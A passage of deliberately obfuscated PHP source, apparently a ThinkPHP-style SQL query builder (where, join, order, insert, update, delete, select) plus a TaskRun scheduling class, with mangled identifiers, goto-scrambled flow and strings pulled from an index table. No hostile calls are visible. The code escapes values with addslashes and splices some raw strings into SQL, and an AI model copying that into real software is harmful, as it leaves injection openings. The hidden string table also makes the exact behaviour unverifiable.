(preg_match($dË’©§ğØ[1000], $DñÃÜã‘ºˆ[0])) { if (is_array($DñÃÜã‘ºˆ[1])) { $Bğ·¦øÙ´ã = isset($DñÃÜã‘ºˆ[2]) ? strtoupper($DñÃÜã‘ºˆ[2]) : $dË’©§ğØ[985]; if (in_array($Bğ·¦øÙ´ã, array($dË’©§ğØ[984], $dË’©§ğØ[985], $dË’©§ğØ[986]))) { $Cçœ§ƒ—“‚ = array(); foreach ($DñÃÜã‘ºˆ[1] as $e†ÑÅø™) { $Cçœ§ƒ—“‚[] = $Fğõß§îŠ . $dË’©§ğØ[50] . $this->exp[$aö–À“•Õ] . $dË’©§ğØ[50] . $this->parseValue($e†ÑÅø™); } $a˜ƒ² º .= $dË’©§ğØ[258] . implode($dË’©§ğØ[50] . $Bğ·¦øÙ´ã . $dË’©§ğØ[50], $Cçœ§ƒ—“‚) . $dË’©§ğØ[891]; } } else { $a˜ƒ² º .= $Fğõß§îŠ . $dË’©§ğØ[50] . $this->exp[$aö–À“•Õ] . $dË’©§ğØ[50] . $this->parseValue($DñÃÜã‘ºˆ[1]); } } elseif ($dË’©§ğØ[295] == $aö–À“•Õ) { $a˜ƒ² º .= $dË’©§ğØ[889] . $Fğõß§îŠ . $dË’©§ğØ[50] . $DñÃÜã‘ºˆ[1] . $dË’©§ğØ[1001]; } elseif (preg_match($dË’©§ğØ[1002], $DñÃÜã‘ºˆ[0])) { $a˜ƒ² º .= $DñÃÜã‘ºˆ[0]; } elseif (preg_match($dË’©§ğØ[1003], $DñÃÜã‘ºˆ[0])) { if (isset($DñÃÜã‘ºˆ[2]) && $dË’©§ğØ[295] == $DñÃÜã‘ºˆ[2]) { $a˜ƒ² º .= $Fğõß§îŠ . $dË’©§ğØ[50] . $this->exp[$aö–À“•Õ] . $dË’©§ğØ[50] . $DñÃÜã‘ºˆ[1]; } else { if (is_string($DñÃÜã‘ºˆ[1])) { $DñÃÜã‘ºˆ[1] = explode($dË’©§ğØ[47], $DñÃÜã‘ºˆ[1]); } $eŠùÔ¤äÄù = implode($dË’©§ğØ[47], $this->parseValue($DñÃÜã‘ºˆ[1])); $a˜ƒ² º .= $Fğõß§îŠ . $dË’©§ğØ[50] . $this->exp[$aö–À“•Õ] . $dË’©§ğØ[889] . $eŠùÔ¤äÄù . $dË’©§ğØ[891]; } } elseif (preg_match($dË’©§ğØ[1004], $DñÃÜã‘ºˆ[0])) { $eÚ²®ÙÀÈ = is_string($DñÃÜã‘ºˆ[1]) ? explode($dË’©§ğØ[47], $DñÃÜã‘ºˆ[1]) : $DñÃÜã‘ºˆ[1]; $a˜ƒ² º .= $dË’©§ğØ[889] . $Fğõß§îŠ . $dË’©§ğØ[50] . $this->exp[$aö–À“•Õ] . $dË’©§ğØ[50] . $this->parseValue($eÚ²®ÙÀÈ[0]) . $dË’©§ğØ[987] . $this->parseValue($eÚ²®ÙÀÈ[1]) . $dË’©§ğØ[276]; } else { think_exception(think_lang($dË’©§ğØ[990]) . $dË’©§ğØ[4] . $DñÃÜã‘ºˆ[0]); } } else { $A¶Öğø‚— = count($DñÃÜã‘ºˆ); $BàĞÊ…ÁÓ = $dË’©§ğØ[33]; if (is_string($DñÃÜã‘ºˆ[$A¶Öğø‚— - 1])) { $BàĞÊ…ÁÓ = isset($DñÃÜã‘ºˆ[$A¶Öğø‚— - 1]) ? strtoupper($DñÃÜã‘ºˆ[$A¶Öğø‚— - 1]) : $dË’©§ğØ[33]; if (in_array($BàĞÊ…ÁÓ, array($dË’©§ğØ[984], $dË’©§ğØ[985], $dË’©§ğØ[986]))) { $A¶Öğø‚— = $A¶Öğø‚— - 1; } } else { $BàĞÊ…ÁÓ = $dË’©§ğØ[984]; } for ($eŞ¶¶Œ„ºÑ = 0; $eŞ¶¶Œ„ºÑ < $A¶Öğø‚—; $eŞ¶¶Œ„ºÑ++) { $eÚ²®ÙÀÈ = is_array($DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ]) ? $DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ][1] : $DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ]; if ($dË’©§ğØ[295] == strtolower($DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ][0])) { $a˜ƒ² º .= $dË’©§ğØ[258] . $Fğõß§îŠ . $dË’©§ğØ[50] . $eÚ²®ÙÀÈ . $dË’©§ğØ[1001] . $BàĞÊ…ÁÓ . $dË’©§ğØ[50]; } else { $BÁ×§ É¦ = is_array($DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ]) ? $this->exp[strtolower($DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ][0])] : $dË’©§ğØ[977]; if (!$BÁ×§ É¦ && is_array($DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ]) && in_array($DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ][0], array($dË’©§ğØ[977], $dË’©§ğØ[994], $dË’©§ğØ[995], $dË’©§ğØ[996], $dË’©§ğØ[997], $dË’©§ğØ[998]))) { $BÁ×§ É¦ = $DñÃÜã‘ºˆ[$eŞ¶¶Œ„ºÑ][0]; } $a˜ƒ² º .= $dË’©§ğØ[258] . $Fğõß§îŠ . $dË’©§ğØ[50] . $BÁ×§ É¦ . $dË’©§ğØ[50] . $this->parseValue($eÚ²®ÙÀÈ) . $dË’©§ğØ[1001] . $BàĞÊ…ÁÓ . $dË’©§ğØ[50]; } } $a˜ƒ² º = substr($a˜ƒ² º, 0, -4); } } else { $a˜ƒ² º .= $Fğõß§îŠ . $dË’©§ğØ[1005] . $this->parseValue($DñÃÜã‘ºˆ); } return $a˜ƒ² º; } protected function parseThinkWhere($aİõ•¤‘Âï, $DêÈ–…Ï) { $e‘¦İÄ¸à” =& $_SERVER[›èö’ù¤]; $d¥òØÖÜõ = $e‘¦İÄ¸à”[33]; switch ($aİõ•¤‘Âï) { case $e‘¦İÄ¸à”[350]: $d¥òØÖÜõ = $DêÈ–…Ï; break; case $e‘¦İÄ¸à”[988]: $d¥òØÖÜõ = is_string($DêÈ–…Ï) ? $DêÈ–…Ï : substr($this->parseWhere($DêÈ–…Ï), 6); break; case $e‘¦İÄ¸à”[1006]: parse_str($DêÈ–…Ï, $Bé“¶èóµğ); if (isset($Bé“¶èóµğ[$e‘¦İÄ¸à”[983]])) { $BÙ­’ëÊÍê = $e‘¦İÄ¸à”[50] . strtoupper($Bé“¶èóµğ[$e‘¦İÄ¸à”[983]]) . $e‘¦İÄ¸à”[50]; unset($Bé“¶èóµğ[$e‘¦İÄ¸à”[983]]); } else { $BÙ­’ëÊÍê = $e‘¦İÄ¸à”[987]; } $AÖ´¥ô‚êæ = array(); foreach ($Bé“¶èóµğ as $Aí‹Å ÔÚ½ => $aî¤ëÀëŠ§) { $AÖ´¥ô‚êæ[] = $this->parseKey($Aí‹Å ÔÚ½) . $e‘¦İÄ¸à”[1005] . $this->parseValue($aî¤ëÀëŠ§); } $d¥òØÖÜõ = implode($BÙ­’ëÊÍê, $AÖ´¥ô‚êæ); break; } return $d¥òØÖÜõ; } protected function parseLimit($B­²‹øÍ‰¤) { $BÙÆ·ªğ› =& $_SERVER[›èö’ù¤]; return !empty($B­²‹øÍ‰¤) ? $BÙÆ·ªğ›[48] . $B­²‹øÍ‰¤ . $BÙÆ·ªğ›[50] : $BÙÆ·ªğ›[33]; } protected function parseJoin($eªÄŞ«â¥) { $D‹Œº¶öÒ =& $_SERVER[›èö’ù¤]; $F¢â¢ñâÃ¤ = $D‹Œº¶öÒ[33]; if (!empty($eªÄŞ«â¥)) { if (is_array($eªÄŞ«â¥)) { foreach ($eªÄŞ«â¥ as $E±ø¬³­Ç³ => $aœŒ¸†ç›ö) { if (!1 !== stripos($aœŒ¸†ç›ö, $D‹Œº¶öÒ[1007])) { $F¢â¢ñâÃ¤ .= $D‹Œº¶öÒ[50] . $aœŒ¸†ç›ö; } else { $F¢â¢ñâÃ¤ .= $D‹Œº¶öÒ[1008] . $aœŒ¸†ç›ö; } } } else { $F¢â¢ñâÃ¤ .= $D‹Œº¶öÒ[1008] . $eªÄŞ«â¥; } } $F¢â¢ñâÃ¤ = preg_replace($D‹Œº¶öÒ[1009], think_config($D‹Œº¶öÒ[915]) . $D‹Œº¶öÒ[1010], $F¢â¢ñâÃ¤); return $F¢â¢ñâÃ¤; } protected function parseOrder($Cø±Ü•‡ƒ) { $E¤×¨……à =& $_SERVER[›èö’ù¤]; if (is_array($Cø±Ü•‡ƒ)) { $EÔ­²Ó‚é = array(); foreach ($Cø±Ü•‡ƒ as $a¼ÀÖñ³ÒÓ => $DÁà ìÏ“õ) { if (is_numeric($a¼ÀÖñ³ÒÓ)) { $EÔ­²Ó‚é[] = $this->parseKey($DÁà ìÏ“õ); } else { $DÁà ìÏ“õ = in_array(strtoupper(trim($DÁà ìÏ“õ)), array($E¤×¨……à[1011], $E¤×¨……à[1012])) ? $E¤×¨……à[50] . $DÁà ìÏ“õ : $E¤×¨……à[33]; if (preg_match($E¤×¨……à[1013], $a¼ÀÖñ³ÒÓ)) { $EÔ­²Ó‚é[] = $this->parseKey($a¼ÀÖñ³ÒÓ) . $DÁà ìÏ“õ; } else { think_exception($E¤×¨……à[1014] . $a¼ÀÖñ³ÒÓ); } } } $Cø±Ü•‡ƒ = implode($E¤×¨……à[47], $EÔ­²Ó‚é); } return !empty($Cø±Ü•‡ƒ) ? $E¤×¨……à[1015] . $Cø±Ü•‡ƒ : $E¤×¨……à[33]; } protected function parseGroup($aŠæğôÏ’¤) { $AÀ”±³Œ¦¢ =& $_SERVER[›èö’ù¤]; return !empty($aŠæğôÏ’¤) ? $AÀ”±³Œ¦¢[1016] . $aŠæğôÏ’¤ : $AÀ”±³Œ¦¢[33]; } protected function parseHaving($AÛ˜µ †âÙ) { $d„Õ¹‚¶õ‘ =& $_SERVER[›èö’ù¤]; return !empty($AÛ˜µ †âÙ) ? $d„Õ¹‚¶õ‘[1017] . $AÛ˜µ †âÙ : $d„Õ¹‚¶õ‘[33]; } protected function parseComment($d¹³ç•–ù‹) { $d¦‰ö¦¿ÓĞ =& $_SERVER[›èö’ù¤]; return !empty($d¹³ç•–ù‹) ? $d¦‰ö¦¿ÓĞ[1018] . $d¹³ç•–ù‹ . $d¦‰ö¦¿ÓĞ[1019] : $d¦‰ö¦¿ÓĞ[33]; } protected function parseDistinct($D§Ï®­ªÅ²) { $aĞÅ°ÁÛ—Ä =& $_SERVER[›èö’ù¤]; return !empty($D§Ï®­ªÅ²) ? $aĞÅ°ÁÛ—Ä[1020] : $aĞÅ°ÁÛ—Ä[33]; } protected function parseUnion($b±œÉì’öå) { $bÇ¨¯Ë­¾® =& $_SERVER[›èö’ù¤]; if (empty($b±œÉì’öå)) { return $bÇ¨¯Ë­¾®[33]; } if (isset($b±œÉì’öå[$bÇ¨¯Ë­¾®[346]])) { $eªØÌ£Îˆ = $bÇ¨¯Ë­¾®[1021]; unset($b±œÉì’öå[$bÇ¨¯Ë­¾®[346]]); } else { $eªØÌ£Îˆ = $bÇ¨¯Ë­¾®[1022]; } foreach ($b±œÉì’öå as $EÅ‚‰øì´ã) { $bºï‰ø¯¹[] = $eªØÌ£Îˆ . (is_array($EÅ‚‰øì´ã) ? $this->buildSelectSql($EÅ‚‰øì´ã) : $EÅ‚‰øì´ã); } return implode($bÇ¨¯Ë­¾®[50], $bºï‰ø¯¹); } public function insert($F°ìø¡‚–², $EÑˆ…«¥®È = array(), $a·Ô¤šÅ„¯ = false) { goto fôÙó±¾Îæ; fôÙó±¾Îæ: $eÂ½º™øË =& $_SERVER[›èö’ù¤]; $DñÚŠ¥òÉã = $EëÉ×ñ—Ø = array(); $this->model = $EÑˆ…«¥®È[$eÂ½º™øË[279]]; goto cß—Ô²µ´Ö; BîŸßí×…: $F¨’×ºÇô .= $this->parseComment(!empty($EÑˆ…«¥®È[$eÂ½º™øË[352]]) ? $EÑˆ…«¥®È[$eÂ½º™øË[352]] : $eÂ½º™øË[33]); return $this->execute($F¨’×ºÇô, $this->parseBind(!empty($EÑˆ…«¥®È[$eÂ½º™øË[283]]) ? $EÑˆ…«¥®È[$eÂ½º™øË[283]] : array())); goto EÃ¢¿ß˜ôÛ; cß—Ô²µ´Ö: foreach ($F°ìø¡‚–² as $fÕ¾Éª‘Ë¿ => $e¢®å¤Éİ) { if (is_array($e¢®å¤Éİ) && $eÂ½º™øË[295] == $e¢®å¤Éİ[0]) { $EëÉ×ñ—Ø[] = $this->parseKey($fÕ¾Éª‘Ë¿); $DñÚŠ¥òÉã[] = $e¢®å¤Éİ[1]; } elseif (is_scalar($e¢®å¤Éİ) || is_null($e¢®å¤Éİ)) { $EëÉ×ñ—Ø[] = $this->parseKey($fÕ¾Éª‘Ë¿); $DñÚŠ¥òÉã[] = $this->parseValue($e¢®å¤Éİ); } } $F¨’×ºÇô = ($a·Ô¤šÅ„¯ ? $eÂ½º™øË[893] : $eÂ½º™øË[894]) . $eÂ½º™øË[895] . $this->parseTable($EÑˆ…«¥®È[$eÂ½º™øË[277]]) . $eÂ½º™øË[889] . implode($eÂ½º™øË[47], $EëÉ×ñ—Ø) . $eÂ½º™øË[890] . implode($eÂ½º™øË[47], $DñÚŠ¥òÉã) . $eÂ½º™øË[891]; $F¨’×ºÇô .= $this->parseLock(isset($EÑˆ…«¥®È[$eÂ½º™øË[845]]) ? $EÑˆ…«¥®È[$eÂ½º™øË[845]] : !1); goto BîŸßí×…; EÃ¢¿ß˜ôÛ: } public function selectInsert($eé¾ÙÊá³‚, $FŒææ¼¾¤ª, $F“âŸö˜ª = array()) { goto eÅ—İ¯èÍ; Dóñâ‘İ: array_walk($eé¾ÙÊá³‚, array($this, $fàöàÍ­[892])); $B¨Úñ»ÓÕŒ = $fàöàÍ­[1023] . $this->parseTable($FŒææ¼¾¤ª) . $fàöàÍ­[889] . implode($fàöàÍ­[47], $eé¾ÙÊá³‚) . $fàöàÍ­[1001]; $B¨Úñ»ÓÕŒ .= $this->buildSelectSql($F“âŸö˜ª); goto DÎ”Ğ›ƒ•­; DÎ”Ğ›ƒ•­: return $this->execute($B¨Úñ»ÓÕŒ, $this->parseBind(!empty($F“âŸö˜ª[$fàöàÍ­[283]]) ? $F“âŸö˜ª[$fàöàÍ­[283]] : array())); goto AÅæ´Ğ—¡Ø; eÅ—İ¯èÍ: $fàöàÍ­ =& $_SERVER[›èö’ù¤]; $this->model = $F“âŸö˜ª[$fàöàÍ­[279]]; if (is_string($eé¾ÙÊá³‚)) { $eé¾ÙÊá³‚ = explode($fàöàÍ­[47], $eé¾ÙÊá³‚); } goto Dóñâ‘İ; AÅæ´Ğ—¡Ø: } public function update($f›½£é˜™Ä, $dÎÌ†¢‚ ›) { $D¶¹œƒÅ…ç =& $_SERVER[›èö’ù¤]; $this->model = $dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[279]]; $FØ¥ïÊ›¯ = $D¶¹œƒÅ…ç[1024] . $this->parseTable($dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[277]]) . $this->parseSet($f›½£é˜™Ä) . $this->parseWhere(!empty($dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[273]]) ? $dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[273]] : $D¶¹œƒÅ…ç[33]) . $this->parseOrder(!empty($dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[363]]) ? $dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[363]] : $D¶¹œƒÅ…ç[33]) . $this->parseLimit(!empty($dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[290]]) ? $dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[290]] : $D¶¹œƒÅ…ç[33]) . $this->parseLock(isset($dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[845]]) ? $dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[845]] : !1) . $this->parseComment(!empty($dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[352]]) ? $dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[352]] : $D¶¹œƒÅ…ç[33]); return $this->execute($FØ¥ïÊ›¯, $this->parseBind(!empty($dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[283]]) ? $dÎÌ†¢‚ ›[$D¶¹œƒÅ…ç[283]] : array())); } public function delete($aÙ“ææŒ¸Û = array()) { $AàÚöˆò˜ß =& $_SERVER[›èö’ù¤]; $this->model = $aÙ“ææŒ¸Û[$AàÚöˆò˜ß[279]]; $C×ÙÓãœ‡Ô = $AàÚöˆò˜ß[1025] . $this->parseTable($aÙ“ææŒ¸Û[$AàÚöˆò˜ß[277]]) . $this->parseWhere(!empty($aÙ“ææŒ¸Û[$AàÚöˆò˜ß[273]]) ? $aÙ“ææŒ¸Û[$AàÚöˆò˜ß[273]] : $AàÚöˆò˜ß[33]) . $this->parseOrder(!empty($aÙ“ææŒ¸Û[$AàÚöˆò˜ß[363]]) ? $aÙ“ææŒ¸Û[$AàÚöˆò˜ß[363]] : $AàÚöˆò˜ß[33]) . $this->parseLimit(!empty($aÙ“ææŒ¸Û[$AàÚöˆò˜ß[290]]) ? $aÙ“ææŒ¸Û[$AàÚöˆò˜ß[290]] : $AàÚöˆò˜ß[33]) . $this->parseLock(isset($aÙ“ææŒ¸Û[$AàÚöˆò˜ß[845]]) ? $aÙ“ææŒ¸Û[$AàÚöˆò˜ß[845]] : !1) . $this->parseComment(!empty($aÙ“ææŒ¸Û[$AàÚöˆò˜ß[352]]) ? $aÙ“ææŒ¸Û[$AàÚöˆò˜ß[352]] : $AàÚöˆò˜ß[33]); return $this->execute($C×ÙÓãœ‡Ô, $this->parseBind(!empty($aÙ“ææŒ¸Û[$AàÚöˆò˜ß[283]]) ? $aÙ“ææŒ¸Û[$AàÚöˆò˜ß[283]] : array())); } public function select($AÕÎ¨øì¤ = array()) { goto aÌö†ÌŞº; bÁĞ·ÙöÅ: $C¹Á´àÔ¬ = isset($AÕÎ¨øì¤[$B¯¾éºµ®Á[347]]) ? $AÕÎ¨øì¤[$B¯¾éºµ®Á[347]] : !1; if ($C¹Á´àÔ¬) { $a¸ì£©•¥ = is_string($C¹Á´àÔ¬[$B¯¾éºµ®Á[93]]) ? $C¹Á´àÔ¬[$B¯¾éºµ®Á[93]] : $B¯¾éºµ®Á[1026] . md5($cßÍ–‘è‚); $e´½ˆ™‰¤ = think_cache($a¸ì£©•¥, $B¯¾éºµ®Á[33], $C¹Á´àÔ¬); if (!1 !== $e´½ˆ™‰¤) { return $e´½ˆ™‰¤; } } $eÛõ«“¬¸Ó = $this->query($cßÍ–‘è‚, $this->parseBind(!empty($AÕÎ¨øì¤[$B¯¾éºµ®Á[283]]) ? $AÕÎ¨øì¤[$B¯¾éºµ®Á[283]] : array())); goto fÄÕÃ°Àªí; fÄÕÃ°Àªí: if ($C¹Á´àÔ¬ && !1 !== $eÛõ«“¬¸Ó) { think_cache($a¸ì£©•¥, $eÛõ«“¬¸Ó, $C¹Á´àÔ¬); } return $eÛõ«“¬¸Ó; goto E©¨İ°¾½ù; aÌö†ÌŞº: $B¯¾éºµ®Á =& $_SERVER[›èö’ù¤]; $this->model = $AÕÎ¨øì¤[$B¯¾éºµ®Á[279]]; $cßÍ–‘è‚ = $this->buildSelectSql($AÕÎ¨øì¤); goto bÁĞ·ÙöÅ; E©¨İ°¾½ù: } public function buildSelectSql($a‰ª—ÇìÔ = array()) { goto B ©Ëß»é­; b¡™˜©Ñë¶: $b¦ñô›°ğ¥ = $this->parseSql($this->selectSql, $a‰ª—ÇìÔ); $b¦ñô›°ğ¥ .= $this->parseLock(isset($a‰ª—ÇìÔ[$f«©¹¯¡¿Š[845]]) ? $a‰ª—ÇìÔ[$f«©¹¯¡¿Š[845]] : !1); if (isset($A³…õìÕÒ‹)) { think_cache($A³…õìÕÒ‹, $b¦ñô›°ğ¥); } goto d†·Ğ²ÌĞÙ; d†·Ğ²ÌĞÙ: return $b¦ñô›°ğ¥; goto d¾Çïˆåœ; B ©Ëß»é­: $f«©¹¯¡¿Š =& $_SERVER[›èö’ù¤]; if (isset($a‰ª—ÇìÔ[$f«©¹¯¡¿Š[351]])) { if (strpos($a‰ª—ÇìÔ[$f«©¹¯¡¿Š[351]], $f«©¹¯¡¿Š[47])) { list($aÓÁÃËä‰å, $C”Í›Á§“è) = explode($f«©¹¯¡¿Š[47], $a‰ª—ÇìÔ[$f«©¹¯¡¿Š[351]]); } else { $aÓÁÃËä‰å = $a‰ª—ÇìÔ[$f«©¹¯¡¿Š[351]]; } $aÓÁÃËä‰å = $aÓÁÃËä‰å ? $aÓÁÃËä‰å : 1; $C”Í›Á§“è = isset($C”Í›Á§“è) ? $C”Í›Á§“è : (is_numeric($a‰ª—ÇìÔ[$f«©¹¯¡¿Š[290]]) ? $a‰ª—ÇìÔ[$f«©¹¯¡¿Š[290]] : 20); $c©Õ¸‡ñĞ§ = $C”Í›Á§“è * ((int) $aÓÁÃËä‰å - 1); $a‰ª—ÇìÔ[$f«©¹¯¡¿Š[290]] = $c©Õ¸‡ñĞ§ . $f«©¹¯¡¿Š[47] . $C”Í›Á§“è; } if (think_config($f«©¹¯¡¿Š[1027])) { $A³…õìÕÒ‹ = $f«©¹¯¡¿Š[1028] . md5(serialize($a‰ª—ÇìÔ)); $BªéÜµ¡ˆš = think_cache($A³…õìÕÒ‹); if ($BªéÜµ¡ˆš) { return $BªéÜµ¡ˆš; } } goto b¡™˜©Ñë¶; d¾Çïˆåœ: } public function parseSql($Aó¬»‰êÅ, $fùğ®Œâ«– = array()) { $B‰—×´àø¯ =& $_SERVER[›èö’ù¤]; $Aó¬»‰êÅ = str_replace(array($B‰—×´àø¯[1029], $B‰—×´àø¯[1030], $B‰—×´àø¯[1031], $B‰—×´àø¯[1032], $B‰—×´àø¯[1033], $B‰—×´àø¯[1034], $B‰—×´àø¯[1035], $B‰—×´àø¯[1036], $B‰—×´àø¯[1037], $B‰—×´àø¯[1038], $B‰—×´àø¯[1039]), array($this->parseTable("{$fùğ®Œâ«–[$B‰—×´àø¯[277]]}"), $this->parseDistinct(isset($fùğ®Œâ«–[$B‰—×´àø¯[1040]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[1040]] : !1), $this->parseField(!empty($fùğ®Œâ«–[$B‰—×´àø¯[271]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[271]] : $B‰—×´àø¯[182]), $this->parseJoin(!empty($fùğ®Œâ«–[$B‰—×´àø¯[280]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[280]] : $B‰—×´àø¯[33]), $this->parseWhere(!empty($fùğ®Œâ«–[$B‰—×´àø¯[273]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[273]] : $B‰—×´àø¯[33]), $this->parseGroup(!empty($fùğ®Œâ«–[$B‰—×´àø¯[510]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[510]] : $B‰—×´àø¯[33]), $this->parseHaving(!empty($fùğ®Œâ«–[$B‰—×´àø¯[1041]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[1041]] : $B‰—×´àø¯[33]), $this->parseOrder(!empty($fùğ®Œâ«–[$B‰—×´àø¯[363]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[363]] : $B‰—×´àø¯[33]), $this->parseLimit(!empty($fùğ®Œâ«–[$B‰—×´àø¯[290]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[290]] : $B‰—×´àø¯[33]), $this->parseUnion(!empty($fùğ®Œâ«–[$B‰—×´àø¯[345]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[345]] : $B‰—×´àø¯[33]), $this->parseComment(!empty($fùğ®Œâ«–[$B‰—×´àø¯[352]]) ? $fùğ®Œâ«–[$B‰—×´àø¯[352]] : $B‰—×´àø¯[33])), $Aó¬»‰êÅ); return $Aó¬»‰êÅ; } public function getLastSql($aôÎ§ÆÀª× = '') { return $aôÎ§ÆÀª× ? $this->modelSql[$aôÎ§ÆÀª×] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($fÏŠê–±ÈÖ) { return addslashes($fÏŠê–±ÈÖ); } public function setModel($D«‰ò¥İÆ) { $this->model = $D«‰ò¥İÆ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto Fƒ ÆŠë“ñ; eÊ÷ÍùÇ™Š: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($dÑÀŒ¼«ää, $Bäóé‘Õƒ² = 5.0) { if (!$dÑÀŒ¼«ää) { return; } $c³Š·§åîŒ = Cache::get($dÑÀŒ¼«ää); if (!$c³Š·§åîŒ || timeFloat() - floatVal($c³Š·§åîŒ) >= $Bäóé‘Õƒ²) { Cache::set($dÑÀŒ¼«ää, timeFloat(), $Bäóé‘Õƒ² * 10); return !0; } return !1; } public static function timeLimitCall($AºÄ„ÁïÛ•, $d÷‹­Ÿ†Ìø, $EÃ¡ ë°´ø, $Bšï¯·ŒÛ§ = 5.0) { goto e‹Ê›’¶È¶; e‹Ê›’¶È¶: $A¬…‹‹œ =& $_SERVER[›èö’ù¤]; if (!$AºÄ„ÁïÛ• || !$d÷‹­Ÿ†Ìø) { return; } self::$asyncAdd = !0; goto b™Õ÷²¹; D®×®„­: Cache::set($f¬Ö‰ŞÚãğ, $e×´‰½Ç¶ä, 60); Cache::removeMemory($f¬Ö‰ŞÚãğ); write_log($A¬…‹‹œ[1634] . $AºÄ„ÁïÛ• . $A¬…‹‹œ[68] . $d÷‹­Ÿ†Ìø, $A¬…‹‹œ[1628]); goto aã‘‚Üæ²…; b™Õ÷²¹: $f¬Ö‰ŞÚãğ = $A¬…‹‹œ[1631]; $e×´‰½Ç¶ä = Cache::get($f¬Ö‰ŞÚãğ, !0); $eêœªğ‚Ä = array($A¬…‹‹œ[1632] => timeFloat(), $A¬…‹‹œ[1633] => timeFloat(), $A¬…‹‹œ[262] => $d÷‹­Ÿ†Ìø, $A¬…‹‹œ[1626] => $EÃ¡ ë°´ø, $A¬…‹‹œ[197] => $Bšï¯·ŒÛ§); goto f³ÏßË¦; f³ÏßË¦: if (is_array($e×´‰½Ç¶ä[$AºÄ„ÁïÛ•])) { $eêœªğ‚Ä[$A¬…‹‹œ[1633]] = $e×´‰½Ç¶ä[$AºÄ„ÁïÛ•][$A¬…‹‹œ[1633]]; } if (is_array($e×´‰½Ç¶ä[$AºÄ„ÁïÛ•])) { if (timeFloat() - $e×´‰½Ç¶ä[$AºÄ„ÁïÛ•][$A¬…‹‹œ[1632]] < $eêœªğ‚Ä[$A¬…‹‹œ[197]] * 0.3) { return; } $eêœªğ‚Ä[$A¬…‹‹œ[1633]] = $e×´‰½Ç¶ä[$AºÄ„ÁïÛ•][$A¬…‹‹œ[1633]]; } $e×´‰½Ç¶ä[$AºÄ„ÁïÛ•] = $eêœªğ‚Ä; goto D®×®„­; aã‘‚Üæ²…: } public static function timeLimitCallLoop() { goto f‡áãïßä¥; f‡áãïßä¥: $eù’ÕÄ÷Ş¦ =& $_SERVER[›èö’ù¤]; $aìõï…ù…Ö = array($eù’ÕÄ÷Ş¦[1635]); $C‡Œ–™ß§å = in_array(strtolower(ACTION), $aìõï…ù…Ö); goto B–†«›¼Ô…; A¿Äñ¡ãìÉ: if (!$C…Œª—ï§­) { return Cache::remove($E¨Ğ™½À); } Cache::set($E¨Ğ™½À, $C…Œª—ï§­, 60); Cache::removeMemory($E¨Ğ™½À); goto aÄ†ìË‹½œ; dé¹Ä¤ó¡Ô: if (!$c˜µ‰ì…Ó || count($c˜µ‰ì…Ó) <= 0) { return; } $bÂË ÇˆŸ¦ = !1; $AÎÉçª§Œå = timeFloat(); goto F®Ÿ¯ƒÆŸŸ; B–†«›¼Ô…: if (!$C‡Œ–™ß§å && !self::$asyncAdd) { return; } $E¨Ğ™½À = $eù’ÕÄ÷Ş¦[1631]; $c˜µ‰ì…Ó = Cache::get($E¨Ğ™½À, !0); goto dé¹Ä¤ó¡Ô; F®Ÿ¯ƒÆŸŸ: $C…Œª—ï§­ = array(); foreach ($c˜µ‰ì…Ó as $d¼Î®ãì‘— => $a–óÍ…¸Š) { if ($AÎÉçª§Œå - $a–óÍ…¸Š[$eù’ÕÄ÷Ş¦[1633]] > $a–óÍ…¸Š[$eù’ÕÄ÷Ş¦[197]]) { $bÂË ÇˆŸ¦ = !0; try { Hook::apply($a–óÍ…¸Š[$eù’ÕÄ÷Ş¦[262]], $a–óÍ…¸Š[$eù’ÕÄ÷Ş¦[1626]]); write_log($eù’ÕÄ÷Ş¦[1636] . $d¼Î®ãì‘— . $eù’ÕÄ÷Ş¦[68] . $a–óÍ…¸Š[$eù’ÕÄ÷Ş¦[262]] . $eù’ÕÄ÷Ş¦[1637] . ACTION, $eù’ÕÄ÷Ş¦[1628]); } catch (Exception $aóßéö˜çª) { } continue; } $C…Œª—ï§­[$d¼Î®ãì‘—] = $a–óÍ…¸Š; } if (!$bÂË ÇˆŸ¦) { return; } goto A¿Äñ¡ãìÉ; aÄ†ìË‹½œ: } public static function finished($E•æòİ‘’, $EíˆŸ¡Á¾¨) { $a•ÜàñçŒ =& $_SERVER[›èö’ù¤]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($a•ÜàñçŒ[262] => $E•æòİ‘’, $a•ÜàñçŒ[1626] => $EíˆŸ¡Á¾¨); } private static function finishedRun() { $BñŠÇ¦ªé¸ =& $_SERVER[›èö’ù¤]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $a—Êöó÷‰) { try { Hook::apply($a—Êöó÷‰[$BñŠÇ¦ªé¸[262]], $a—Êöó÷‰[$BñŠÇ¦ªé¸[1626]]); } catch (Exception 